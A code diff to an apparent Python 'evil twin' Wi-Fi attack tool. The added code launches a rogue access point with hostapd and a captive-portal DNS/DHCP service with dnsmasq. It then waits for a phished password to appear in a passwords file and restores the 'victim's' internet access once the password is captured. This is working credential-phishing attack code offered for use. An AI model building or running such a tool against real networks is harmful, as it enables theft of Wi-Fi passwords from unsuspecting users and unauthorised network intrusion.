@@ -1,4 +1,3 @@
-from numpy import size
 import os
 from scapy.all import get_if_list
 from prompt_toolkit import prompt
@@ -7,6 +6,44 @@ import click
 from utils import *
 from pyfiglet import figlet_format
 from termcolor import cprint
+import subprocess
+import shlex
+
+
+def count_file_chars():
+    char_count = 0
+    with open('./website/passwords.txt', 'r') as file:
+        content = file.read().replace(" ", "")
+        char_count = len(content)
+    return char_count
+
+
+def start_dnsmasq():
+    console.print(f'[bold][yellow]Starting DNS and DHCP services[/][/]')
+    current_count = count_file_chars()
+    create_dnsconf_captive()
+    args = shlex.split("dnsmasq -C config/dns.conf -d")
+    p = subprocess.Popen(args, stdout=subprocess.PIPE)
+    # out, err = p.communicate()
+    # print(out)
+    time.sleep(2)
+    console.print(f'[bold][green]DNS and DHCP successfuly started[/][/]')
+    console.print(f'[bold][yellow]Waiting for password input[/][/]')
+
+
+    while current_count == count_file_chars():
+        console.print(f'[bold][yellow].[/][/]')
+        time.sleep(1)
+
+    console.print(f'[bold][green]Password received![/][/]')
+    console.print(f'[bold][yellow]Renabling internet access for the victim[/][/]')
+    p.kill()
+    overwrite_dnsconf()
+    p = subprocess.Popen(args, stdout=subprocess.PIPE)
+    console.print(f'[bold][green]Internet access fully recovered ending the attack[/][/]')
+    # out, err = p.communicate()
+    # print(out)
+
 
 os.system('clear')
 console = Console()
@@ -23,7 +60,14 @@ while 1:
         net_interface = inet_set_menu()
         while net_interface not in get_if_list() or net_interface is None:
             net_interface = prompt(f'Please insert correct interface name from the next list: [{" ".join(get_if_list())}] \n>> ')
+        os.system('clear')
         set_inet_to_monitor(net_interface)
         set_inet_unmanaged(net_interface)
         set_netmask()
         set_iptables()
+        ap = subprocess.Popen(shlex.split('hostapd config/hostapd.conf'))
+        start_dnsmasq()
+        """
+        here we need to print the password and stop!!
+        """
+        os.system('clear')
